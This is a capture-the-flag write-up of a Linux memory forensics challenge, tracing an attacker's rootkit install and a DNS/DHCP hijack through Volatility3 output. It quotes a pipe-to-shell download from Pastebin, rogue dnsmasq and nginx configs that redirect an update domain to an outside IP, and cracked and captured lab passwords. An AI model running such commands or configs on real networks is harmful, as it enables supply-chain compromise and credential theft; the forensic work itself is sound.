# HTB Holmes CTF 2025 - The Tunnel Without Walls



| Difficulty | Challenge name           | Number of flags |
| ---------- | ------------------------ | --------------- |
| Hard       | The Tunnel Without Walls | 10              | 

## Challenge descriptions

> A memory dump from a connected Linux machine reveals covert network connections, fake services, and unusual redirects. Holmes investigates further to uncover how the attacker is manipulating the entire network!

---


## Flag 1

### 1. What is the Linux kernel version of the provided image? (string)

| Plugin to use     | Answer          |
| ----------------- | --------------- |
| banners.Banners   | 5.10.0-35-amd64 |

Below is an example of the command to execute and its output: 

```bash
hashp4@Forensiku:~/tools/volatility3$ python3 vol.py -f /mnt/c/Users/hashp4/Desktop/memdump.mem banners.Banners
Volatility 3 Framework 2.11.0
Progress:  100.00               PDB scanning finished
Offset  Banner

0x67200200      Linux version 5.10.0-35-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.237-1 (2025-05-19)
0x7f40ba40      Linux version 5.10.0-35-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.237-1 (2025-05-19)
```

We can see that at different offsets, the command return the same results.

---

###  1.1. Creating a new symbol table for our specific Linux kernel version

Now to analyze the memory dump properly, we need to have

From the Volatility documentation [Volatility3 Documentation - Symbol Table](https://volatility3.readthedocs.io/en/latest/symbol-tables.html):
> To determine the string for a particular memory image, use the banners plugin. Once the specific banner is known, try to locate that exact kernel debugging package for the operating system. Unfortunately each distribution provides its debugging packages under different package names and there are so many that the distribution may not keep all old versions of the debugging symbols, and therefore it may not be possible to find the right symbols to analyze a Linux memory image with Volatility. [...] Once a kernel with debugging symbols/appropriate DWARF file has been located, dwarf2json will convert it into an appropriate JSON file.

Since the previous question led us to find the Linux kernel version of the provided image, we can easily find the debugging symbols with a quick Google search: [Debug symbols for linux-image-5.10.0-35-amd64](https://packages.debian.org/bullseye/linux-image-5.10.0-35-amd64-dbg).

Then, we just need to:
- install them through `apt`,
- use `dwarf2json` to convert it into an appropriate JSON file,
- move it to the right location.

Below is the sequence of commands that will achieve that:

```bash
wget http://security.debian.org/debian-security/pool/updates/main/l/linux/linux-image-5.10.0-35-amd64-dbg_5.10.237-1_amd64.deb

sudo apt install ./linux-image-5.10.0-35-amd64-dbg_5.10.237-1_amd64.deb

./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-5.10.0-35-amd64 > dbg-symbols/linux-image-5.10.0-35-amd64-dbg_5.10.237-1_amd64.json

mv linux-image-5.10.0-35-amd64-dbg_5.10.237-1_amd64.json ~/tools/volatility3/volatility3/symbols/linux/
```

Now we are all set and ready to resume our investigation. :) 

---

## Flag 2

### 2. The attacker connected over SSH and executed initial reconnaissance commands. What is the PID of the shell they used? (number)

| Plugins to use                     | Answer |
| ---------------------------------- | ------ |
| linux.psaux.PsAux, linux.bash.Bash | 13608  |

First, we can start by listing running processes with `linux.psaux.PsAux`. The goal is to see a shell process being spawned by a SSH process.

```bash
hashp4@Forensiku:~/tools/volatility3$ python3 vol.py -f /mnt/c/Users/hashp4/Desktop/memdump.mem linux.psaux.PsAux
Volatility 3 Framework 2.11.0
Progress:  100.00               Stacking attempts finished
PID     PPID    COMM    ARGS

1       0       systemd /sbin/init
...
13585   560     sshd    sshd: werni [priv]
13588   1       systemd /lib/systemd/systemd --user
13589   13588   (sd-pam)        (sd-pam)
13607   13585   sshd    sshd: werni@pts/0
13608   13607   bash    -bash
13628   2       kworker/u4:6    [kworker/u4:6]
13661   2       kworker/u4:7    [kworker/u4:7]
13662   2       kworker/u4:8    [kworker/u4:8]
20703   13608   su      su jm
22714   20703   bash    bash
38673   2       kworker/1:0     [kworker/1:0
```

Here we can see that `sshd` (PID 13607) in the context of the user `werni` spawned `bash` (PPID 13607, PID 13608). Now, we can take a look at the commands executed by the attacker with the help of the `linux.bash.Bash` plugin:

```bash
hashp4@Forensiku:~/tools/volatility3$ python3 vol.py -f /mnt/c/Users/hashp4/Desktop/memdump.mem linux.bash.Bash
Volatility 3 Framework 2.11.0

PID     Process CommandTime     Command

13608   bash    2025-09-03 08:16:48.000000 UTC  id
13608   bash    2025-09-03 08:16:52.000000 UTC
13608   bash    2025-09-03 08:16:52.000000 UTC  cat /etc/os-release
13608   bash    2025-09-03 08:16:58.000000 UTC  uname -a
13608   bash    2025-09-03 08:17:02.000000 UTC  ip a
13608   bash    2025-09-03 08:17:04.000000 UTC  0
13608   bash    2025-09-03 08:17:04.000000 UTC  ps aux
13608   bash    2025-09-03 08:17:25.000000 UTC  docker run -v /etc/:/mnt -it alpine
13608   bash    2025-09-03 08:18:11.000000 UTC  su jm
```

We can indeed see the initial reconaissance commands being executed through the bash process observed above. 

---

## Flag 3

### 3. After the initial information gathering, the attacker authenticated as a different user to escalate privileges. Identify and submit that user's credentials. (user:password)

| Plugins to use                                     | Answer    |
| ------------------------------------------------- | ---------- |
| linux.pagecache.Files, linux.pagecache.InodePages | jm:WATSON0 |

We saw above, in the commands executed by the attacker, that after initial reconnaissance, he used `su` to switch to the `jm` user.  

The first step is to gather a list of files present on the host at the time the memory image was created. This can be done through the usage of the plugin `linux.pagecache.Files`. **As the result is very lengthy, it is better to save the output in a text file to grep through later on**.
This is what I'm going to do here, saving it under `files.txt`.

```bash
python3 vol.py -f /mnt/c/Users/hashp4/Desktop/memdump.mem linux.pagecache.Files > files.txt
```

Now that we have a list of files, we can look out if we have a hit on `passwd` or `shadow`, two files were password hashes can / are stored. Starting by checking the first one, we already have an interesting result:

```bash
hashp4@Forensiku:~/tools/volatility3$ grep "/etc/passwd" files.txt
Volatility 3 Framework 2.11.0

SuperblockAddr  MountPoint      Device  InodeNum        InodeAddr       FileType        InodePages      CachedPages     FileMode        AccessTime      ModificationTime        ChangeTime      FilePath

0x9b33882a9000  /       8:1     1832456 0x9b33ac0378c0  REG     1       1       -rw-r--r--      2025-09-03 08:20:33.439196 UTC  2025-09-03 08:20:33.431196 UTC      2025-09-03 08:20:33.431196 UTC  /etc/passwd
0x9b33882a9000  /       8:1     1831568 0x9b33ac0338c0  REG     1       1       -rw-r--r--      2025-09-03 08:20:33.000000 UTC  2025-09-03 08:20:33.000000 UTC      2025-09-03 08:20:33.431196 UTC  /etc/passwd-
```

Indeed, we notice that there's the presence of what appears to be the legitimate `passwd` file, but also another one called `passwd-` catching our attention. The next step is to retrieve it from memory and inspect its content. 
We can do that with the help of the plugin `linux.pagecache.InodePages` using the `InodeNum` which, in our case, is `0x9b33ac0338c0`. 


```bash
python3 vol.py -f /mnt/c/Users/hashp4/Desktop/memdump.mem linux.pagecache.InodePages --inode 0x9b33ac0338c0 --dump passwd-
```

We can just grep to see if we have a hit for the user `jm`.  

```bash
hashp4@Forensiku:~/tools/volatility3$ grep "jm" passwd-
jm:$1$jm$poAH2RyJp8ZllyUvIkxxd0:0:0:root:/root:/bin/bash
```

And we do! The final step is to crack it. We can use hashcat to do so and provide the infamous `rockyou.txt` wordlist. 

```bash
hashp4@Forensiku:~/tools/volatility3$ hashcat -a 0 -m 500 hash.txt /usr/share/wordlists/rockyou.txt  
hashcat (v6.2.6) starting

...

Approaching final keyspace - workload adjusted.           

$1$jm$poAH2RyJp8ZllyUvIkxxd0:WATSON0                      
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
Hash.Target......: $1$jm$poAH2RyJp8ZllyUvIkxxd0
...
```

The result is `WATSON0`

---

## Flag 4

### 4. The attacker downloaded and executed code from Pastebin to install a rootkit. What is the full path of the malicious file? (/path/filename.ext)

| Plugins to use                                                              | Answer                                                        |
| --------------------------------------------------------------------------- | ------------------------------------------------------------- |
| linux.bash.Bash, linux.hidden_modules.Hidden_modules, linux.pagecache.Files | /usr/lib/modules/5.10.0-35-amd64/kernel/lib/Nullincrevenge.ko |

We can see that the attacker retrieved the rootkit from Pastebin and executed it directly in memory, as the command suggest it:

```bash
hashp4@Forensiku:~/tools/volatility3$ python3 vol.py -f /mnt/c/Users/hashp4/Desktop/memdump.mem linux.bash.Bash
PID     Process CommandTime     Command

...
13608   bash    2025-09-03 08:18:11.000000 UTC  su jm
22714   bash    2025-09-03 08:18:15.000000 UTC  poweroff
22714   bash    2025-09-03 08:18:31.000000 UTC  id
22714   bash    2025-09-03 08:18:40.000000 UTC  wget -q -O- https://pastebin.com/raw/hPEBtinX|sh
...
```

Attempting to check the content of the paste directly or through the Wayback machine did not lead to any results. So we have to find another way to find the aforementioned rootkit. After a bit of research, I stumbled upon the following article dealing with kernel rootkits
and Linux memory forensics: [Insmod, Kernel Rootkit, and Network Carving — Another Linux Memory Forensics Approach (L3akCTF Invisible Writeup)](https://medium.com/@rifqiaramadhan/insmod-kernel-rootkit-and-network-carving-another-linux-memory-forensics-approach-l3akctf-b1e547e8c1b6)

A good point made by the author is that we should aspects modules and hidden modules, as they can often be tied to rootkits. For that, two plugins are available with Volatility3: respectively `linux.check_modules.Check_modules` and `linux.hidden_modules.Hidden_modules`.
Using the second one, we can notice a hit:

```bash
hashp4@Forensiku:~/tools/volatility3$ python3 vol.py -f /mnt/c/Users/hashp4/Desktop/memdump.mem linux.hidden_modules.Hidden_modules
Volatility 3 Framework 2.11.0
Progress:  100.00               Stacking attempts finished
Address Name

0xffffc0aa0040  Nullincrevenge
```

There's an hidden module called `Nullincrevenge`, which indeed looks suspicious and is unusual. By greping through the files on the host, we have a hit again:

```bash
hashp4@Forensiku:~/tools/volatility3$ grep "Nullincrevenge" files.txt
0x9b33882a9000  /       8:1     298762  0x9b3386454a80  REG     135     39      -rw-r--r--      2025-09-03 08:18:44.155080 UTC  2025-09-03 08:18:40.799070 UTC  2025-09-03 08:18:40.799070 UTC  /usr/lib/modules/5.10.0-35-amd64/kernel/lib/Nullincrevenge.ko
```

The kernel object `Nullincrevenge.ko`, our rootkit, is located under `/usr/lib/modules/5.10.0-35-amd64/kernel/lib/`.


Bonus: you can also notice the name of the rootkit in `/var/syslog` and `/var/kern.log`: 

```bash
hashp4@Forensiku:~/tools/volatility3$ grep "Nullincrevenge" kern.log
Sep  3 04:18:44 SRNT-13 kernel: [  185.975464] Nullincrevenge: loading out-of-tree module taints kernel.
Sep  3 04:18:44 SRNT-13 kernel: [  185.975545] Nullincrevenge: module verification failed: signature and/or required key missing - tainting kernel
```

---

## Flag 5

### 5. What is the email account of the alleged author of the malicious file? (user@example.com)

| Plugins to use             | Answer               |
| -------------------------- | -------------------- |
| linux.pagecache.InodePages | i-am-the@network.now |

The email of the author of the rootkit is likely located in it. Thus, to retrieve it, we need to dump the file from the memory. In the previous question, we retrieved its `InodeNum` which is `0x9b3386454a80`. We now just have to attempt to dump it with `linux.pagecache.InodePages`.

```bash
python3 vol.py -f /mnt/c/Users/hashp4/Desktop/memdump.mem linux.pagecache.InodePages --inode 0x9b3386454a80 --dump Nullincrevenge.ko
```

Once the file is dumped, we can use `strings` and `grep` to quickly identify the email:

```bash
hashp4@Forensiku:~/tools/volatility3$ strings Nullincrevenge.ko | grep "@"
D$@1
D$@eH+
author=i-am-the@network.now
```

---

## Flag 6

### 6. The next step in the attack involved issuing commands to modify the network settings and installing a new package. What is the name and PID of the package? (package name,PID)

| Plugins to use                     | Answer        |
| ---------------------------------- | ------------- |
| linux.bash.Bash, linux.psaux.PsAux | dnsmasq,38687 |

To answer this question, we can use the result from our previous usage of `linux.bash.Bash`:

```bash
hashp4@Forensiku:~/tools/volatility3$ python3 vol.py -f /mnt/c/Users/hashp4/Desktop/memdump.mem linux.bash.Bash
Volatility 3 Framework 2.11.0

PID     Process CommandTime     Command
....
22714   bash    2025-09-03 08:19:48.000000 UTC  nano /etc/sysctl.conf
22714   bash    2025-09-03 08:20:04.000000 UTC  sysctl --system
22714   bash    2025-09-03 08:20:15.000000 UTC  iptables -A FORWARD -i ens224 -o ens192 -j ACCEPT
22714   bash    2025-09-03 08:20:15.000000 UTC  iptables -A FORWARD -i ens192 -o ens224 -m state --state ESTABLISHED,RELATED -j ACCEPT
22714   bash    2025-09-03 08:20:16.000000 UTC  iptables -t nat -A POSTROUTING -s 192.168.211.0/24 -o ens192 -j MASQUERADE
22714   bash    2025-09-03 08:20:31.000000 UTC  apt install -y dnsmasq
22714   bash    2025-09-03 08:20:50.000000 UTC  rm /etc/dnsmasq.conf
22714   bash    2025-09-03 08:20:56.000000 UTC  nano /etc/dnsmasq.conf
22714   bash    2025-09-03 08:21:23.000000 UTC  systemctl enable --now dnsmasq
22714   bash    2025-09-03 08:21:30.000000 UTC  systemctl restart dnsmasq
...
```

We can notice the user messing with the network configuration of the host. After editing `/etc/sysctl.conf` and modifying firewall rules through `iptables`, we can notice:
- the installation of `dnsmasq` -> `apt install -y dnsmasq`,
- the deletion of its default config file -> `rm /etc/dnsmasq.conf`
- the creation of a new config file -> `nano /etc/dnsmasq.conf`
- enabling and restarting the service.

> dnsmasq is free software providing Domain Name System (DNS) caching, a Dynamic Host Configuration Protocol (DHCP) server, router advertisement and network boot features, intended for small computer networks - [Wikipedia](https://en.wikipedia.org/wiki/Dnsmasq)

This is matching our scenario. As the package was likely running on the host at the time of the memory dump, we can have a look at running processes again using `linux.psaux.PsAux`:

```bash
Volatility 3 Framework 2.11.0

PID     PPID    COMM    ARGS

1       0       systemd /sbin/init
...
38687   1       dnsmasq /usr/sbin/dnsmasq -x /run/dnsmasq/dnsmasq.pid -u dnsmasq -7 /etc/dnsmasq.d,.dpkg-dist,.dpkg-old,.dpkg-new --local-service --trust-anchor=.,20326,8,2,E06D44B80B8F1D39A95C0B0D7C65D08458E880409BBC683457104237C7F8EC8D --trust-anchor=.,38696,8,2,683D2D0ACB8C9B712A1948B27F741219298D0A450D612C483AF444A4C0FB2B16
```

The PID associated to the `dnsmasq` process is `38687`, giving us the flag.

---

## Flag 7

### 7. Clearly, the attacker's goal is to impersonate the entire network. One workstation was already tricked and got its new malicious network configuration. What is the workstation's hostname?

| Plugins to use                              | Answer          |
| --------------------------------------------| --------------- |
| linux.proc.Maps, linux.pagecache.InodePages | Parallax-5-WS-3 |

To answer this question, we can start by having a look at the DNS configuration file from `dnsmasq`: `/etc/dnsmasq.conf`. Why you may ask? Because we should learn about the DHCP range.
As the attacker is trying to impersonate the entire network, they will control both DNS and DHCP at least. Thus, if a workstation will be tricked, it will be assigned a new private IP address by the malicious server.
Knowing the DHCP range will allow us to restrict our research to a specific subnet / range of addresses, that we can use to dig through further afterwards. Looking at the files present on the host, we notice the configuration present at `InodeNum`: `0x9b33ac25aae0`.

```bash
hashp4@Forensiku:~/tools/volatility3$ grep "/etc/dnsmasq.conf" files.txt
Volatility 3 Framework 2.11.0

SuperblockAddr  MountPoint      Device  InodeNum        InodeAddr       FileType        InodePages      CachedPages     FileMode        AccessTime      ModificationTime        ChangeTime      FilePat

0x9b33882a9000  /       8:1     1832539 0x9b33ac25aae0  REG     1       1       -rw-r--r--      2025-09-03 08:21:30.991480 UTC  2025-09-03 08:21:06.343371 UTC  2025-09-03 08:21:06.343371 UTC  /etc/dnsmasq.conf
```

We can now retrieve it with `linux.pagecache.InodePages`:

```bash
python3 vol.py -f /mnt/c/Users/hashp4/Desktop/memdump.mem linux.pagecache.InodePages --inode 0x9b33ac25aae0 --dump dnsmasq.conf
```

And display its content:

```bash
hashp4@Forensiku:~/tools/volatility3$ cat dnsmasq.conf
interface=ens224

dhcp-range=192.168.211.30,192.168.211.240,1h
dhcp-option=3,192.168.211.8
dhcp-option=6,192.168.211.8

no-hosts
no-resolv
server=8.8.8.8
address=/updates.cogwork-1.net/192.168.211.8

log-queries=no
quiet-dhcp
quiet-dhcp6
log-facility=/dev/null
```

Here, we can see that the `dhcp-range` is `192.168.211.30,192.168.211.240,1h`. So looking for strings such as `192.168.211` should be enough. Now the question is where to look at that? Well, in the previous question, we managed to find the PID of `dnsmasq`: `38687`.
Now what we can do is dump the memory of the process, and look for an interesting output. What we have in mind is to find DHCP logs in memory, in order to potentially retrieve a hostname associated with the newly attributed IP address.

Let's dump the process with the help of the `linux.proc.Maps` plugin. Since the output generate quite a lot of files, I have created the directory `pid_38687_dump` beforehand. (*note: give it the right permission or otherwise the plugin will fail*).
```
python3 vol.py -f /mnt/c/Users/hashp4/Desktop/memdump.mem -o pid_38687_dump/ linux.proc.Maps --pid 38687 --dump

```

Then, we can use grep to check through all the newly created files, checking for the string `192.168.211`:

```bash
hashp4@Forensiku:~/tools/volatility3$ strings pid_38687_dump/* | grep "192.168.211"
192.168.211.8
1756891471 00:50:56:b4:32:cd 192.168.211.52 Parallax-5-WS-3 01:00:50:56:b4:32:cd
Sep  3 04:25:48 dnsmasq[38687]: config updates.cogwork-1.net is 192.168.211.8
```

And we got a 3 hits, including one being the IP address `192.168.211.52` followed by a workstation name (`Parallax-5-WS-3`) and a MAC address, giving us the answer to this question: `Parallax-5-WS-3`.

---

## Flag 8

### 8. After receiving the new malicious network configuration, the user accessed the City of CogWork-1 internal portal from this workstation. What is their username? (string)

| Plugins to use | Answer        |
| ---------------| --------------|
| /              | mike.sullivan |

For this question, I did not use any plugins nor Volatility3. I did what we call "Poor man's forensics" and parsed the raw image using `grep`. The questions is giving us a hint: "the user accessed the City of CogWork-1 internal portal from this workstation".

We can assume that there was some HTTP GET and/or POST request to that internal portal. As it is an internal portal, maybe the user even had to log in or to identify itself... Thus, using `strings` and `grep` we can obtain decent results.

```bash
hashp4@Forensiku:~/tools/volatility3$ strings /mnt/c/Users/hashp4/Desktop/memdump.mem | grep -A 15 "POST /.*HTTP/1.*"
...
POST /index.php HTTP/1.1
Host: 10.129.232.25:8081
Connection: keep-alive
Content-Length: 43
Cache-Control: max-age=0
Origin: http://10.129.232.25:8081
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.232.25:8081/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=189b027ab0e5e10f496e57953544cd74
username=mike.sullivan&password=Pizzaaa1%21
...
```

After waiting for a couple of minutes, we have our hit. The username logged in on the host with the username `mike.sullivan` and password `Pizzaaa1!`.

---

## Flag 9

### 9. Finally, the user updated a software to the latest version, as suggested on the internal portal, and fell victim to a supply chain attack. From which Web endpoint was the update downloaded?

| Plugins to use                     | Answer                                          |
| -----------------------------------| ------------------------------------------------|
| linux.psaux.PsAux, linux.proc.Maps | /win10/update/CogSoftware/AetherDesk-v74-77.exe |

Another approach rather than doing "Poor man's forensics" again is to start by listing active processes with `linux.psaux.PsAux` again. There should be a process related to a web server (`Apache`, `nginx`?).

```bash
hashp4@Forensiku:~/tools/volatility3$ python3 vol.py -f /mnt/c/Users/hashp4/Desktop/memdump.mem linux.psaux.PsAux
Volatility 3 Framework 2.11.0

PID     PPID    COMM    ARGS
...
38801   1       containerd-shim /usr/bin/containerd-shim-runc-v2 -namespace moby -id d4759510b68a19bfd55ecb3675bcb3fe88ae0c4a648899ff944a34a234fef2cc -address /run/containerd/containerd.sock
38825   38801   nginx   nginx: master process
38855   38825   nginx   nginx: worker process
38856   38825   nginx   nginx: worker process
...
```

We can notice the presence of what appears to be a `nginx` container. It is running one master and two worker process. Now we can either review the `nginx` logs or dump the processes and search through them with `strings` and `grep`. 
*Spoiler: the first option is a dead-end (at least, I did not find informations that could help solving this question)*.

Thus, we can dump all of these processes with `linux.proc.Maps` and grep through them afterwards. 

```bash
hashp4@Forensiku:~/tools/volatility3$ python3 vol.py -f /mnt/c/Users/hashp4/Desktop/memdump.mem -o nginx_process_dump/ linux.proc.Maps --pid 38801 --dump

hashp4@Forensiku:~/tools/volatility3$ python3 vol.py -f /mnt/c/Users/hashp4/Desktop/memdump.mem -o nginx_process_dump/ linux.proc.Maps --pid 38825 --dump

hashp4@Forensiku:~/tools/volatility3$ python3 vol.py -f /mnt/c/Users/hashp4/Desktop/memdump.mem -o nginx_process_dump/ linux.proc.Maps --pid 38855 --dump

hashp4@Forensiku:~/tools/volatility3$ python3 vol.py -f /mnt/c/Users/hashp4/Desktop/memdump.mem -o nginx_process_dump/ linux.proc.Maps --pid 38856 --dump
```

Once that is done, we can use `strings` and `grep` for interesting strings such as `.exe`, `GET` or both. Indeed, as the victim fell for a supply chain attack, we can assume the malicious update he downloaded was a Windows executable. However, it is as always, jsut assumptions that were verified after running the command. :P 

```bash
hashp4@Forensiku:~/tools/volatility3$ strings nginx_process_dump/* | grep -A 5 "GET.*.exe.*"
GET /win10/update/CogSoftware/AetherDesk-v74-77.exe HTTP/1.0
Host: jm_supply
Connection: close
Accept: */*
User-Agent: AetherDesk/73.0 (Windows NT 10.0; Win64; x64)
200 OKServer
SimpleHTTP/0.6 Python/3.9.23
--
GET /win10/update/CogSoftware/AetherDesk-v74-77.exe HTTP/1.1
Host
 updates.cogwork-1.net
Accept
 */*
User-Agent
...
```

We have two hits for the command. We can see that the the file path seems to be the same (`/win10/update/CogSoftware/AetherDesk-v74-77.exe`), However the host for one request is `updates.cogwork-1.net` and is `jm_supply` for the second. Moreover, we can also notice `SimpleHTTP/0.6 Python/3.9.2` which could indicate how the file was actually served...

In any case, our answer is here: `/win10/update/CogSoftware/AetherDesk-v74-77.exe`.

---

## Flag 10

### 10. To perform this attack, the attacker redirected the original update domain to a malicious one. Identify the original domain and the final redirect IP address and port. (domain,IP:port)

| Plugins to use                                                     | Answer                                 |
| -------------------------------------------------------------------| ---------------------------------------|
| linux.bash.Bash, linux.pagecache.Files, linux.pagecache.InodePages | updates.cogwork-1.net,13.62.49.86:7477 |

To answer this final question, we can use:
1. the commands ran by the attacker:

```bash
hashp4@Forensiku:~/tools/volatility3$ python3 vol.py -f /mnt/c/Users/hashp4/Desktop/memdump.mem linux.bash.Bash
Volatility 3 Framework 2.11.0

PID     Process CommandTime     Command
...
22714   bash    2025-09-03 08:20:31.000000 UTC  apt install -y dnsmasq
22714   bash    2025-09-03 08:20:50.000000 UTC  rm /etc/dnsmasq.conf
22714   bash    2025-09-03 08:20:56.000000 UTC  nano /etc/dnsmasq.conf
22714   bash    2025-09-03 08:21:23.000000 UTC  systemctl enable --now dnsmasq
22714   bash    2025-09-03 08:21:30.000000 UTC  systemctl restart dnsmasq
22714   bash    2025-09-03 08:21:38.000000 UTC  cd /tmp/
22714   bash    2025-09-03 08:21:42.000000 UTC  nano default.conf
22714   bash    2025-09-03 08:22:03.000000 UTC  docker run -d --name jm_proxy --network host -v $(pwd)/default.conf:/etc/nginx/conf.d/default.conf:ro nginx:alpine
22714   bash    2025-09-03 08:22:17.000000 UTC  rm default.conf
...
```

Here, we can see that after modifying the `dnsmasq` configuration and reloading the service, the user also created the file `default.conf` in `/tmp` which would later be provided as the default configuration for the `nginx` container. Furthermore, the user then deleted the `default.conf` file. 
However, what we learnt through this is that we need to inspect both `dnsmasq.conf` and `default.conf` for our answers.

2. We can parse the list of files present on the host at the time of the memory dump, acquired previously with `linux.pagecache.Files` in order to find a potential occurence of both of these files:

```bash
hashp4@Forensiku:~/tools/volatility3$ grep "/etc/dnsmasq.conf" files.txt; grep "/tmp/default.conf" files.txt;
0x9b33882a9000  /       8:1     1832539 0x9b33ac25aae0  REG     1       1       -rw-r--r--      2025-09-03 08:21:30.991480 UTC  2025-09-03 08:21:06.343371 UTC  2025-09-03 08:21:06.343371 UTC  /etc/dnsmasq.conf
0x9b33882a9000  /       8:1     654096  0x9b33ac030f20  REG     1       1       -rw-r--r--      2025-09-03 08:21:52.859555 UTC  2025-09-03 08:21:52.859555 UTC  2025-09-03 08:22:17.959623 UTC  /tmp/default.conf
```

We already saw and retrieved in previous question `dnsmasq.conf` so there's no surprise here. However, we do as well have a hit for `/tmp/default.conf`! Good news, so we can attempt to retrieve it from memory and view its content. As you may know now, we can run the following command:

```bash
python3 vol.py -f /mnt/c/Users/hashp4/Desktop/memdump.mem linux.pagecache.InodePages --inode 0x9b33ac030f20 --dump default.conf
```

Where `0x9b33ac030f20` is the `InodeEnum` of `/tmp/default.conf`. Now that we have our two files, we can just view their content:

Content of `dnsmasq.conf`:
```bash
hashp4@Forensiku:~/tools/volatility3$ cat dnsmasq.conf
interface=ens224

dhcp-range=192.168.211.30,192.168.211.240,1h
dhcp-option=3,192.168.211.8
dhcp-option=6,192.168.211.8

no-hosts
no-resolv
server=8.8.8.8
address=/updates.cogwork-1.net/192.168.211.8

log-queries=no
quiet-dhcp
quiet-dhcp6
log-facility=/dev/null
```

Content of `default.conf`:
```bash
hashp4@Forensiku:~/tools/volatility3$ cat default.conf
server {
    listen 80;

    location / {
        proxy_pass http://13.62.49.86:7477/;
        proxy_set_header Host jm_supply;
    }
}
```

In the `dnsmasq.conf`, we can see that it uses Google DNS (`8.8.8.8`) for most DNS queries, but overrides `updates.cogwork-1.net` to always resolve to `192.168.211.8`. We can assume it is the original domain the attacker wanted to "hijack", which we also saw in the previous question.

In the ``default.conf`, we can see that it is the configuration of a reverse proxy. It basically tells Nginx to forward all incoming requests to the server at http://13.62.49.86:7477/. 
For instance, if someone visits `http://cogwork-1.net/intranet`, `nginx` will forward that request to `http://13.62.49.86:7477/intranet`, which is what happened during the supply chain attack. Additionally, it also set the `Host` header to `jm_supply`. 

Thus, we have our final flag: `updates.cogwork-1.net,13.62.49.86:7477``. 

---

## Conclusion

Thank you dear reader for checking this short write-up. I hope you learnt a few tricks or refreshed your memory on some aspects. Please feel free to check my other (quite old) articles or writeups if you are interested. It reminds me that I should update this blog more...

Thank you to Hack The Box and their challmakers for the great challenge. It was a great opportunity to discover or revisit my memory forensic skillset, especially toward Linux memory dumps. It is not something we often see in the wild or during competitions and it was as well a good occasion to solely use Volatility3 instead of a Volatility2. (and no MemProcFS D:)

I had a lot of fun solving the 5 challenges thorough the competition with two of my teammates. Congratulations again to Hack The Box for organizing their first all-blue CTF. Hopefully it will not be the last edition. I am eager for more :D! 

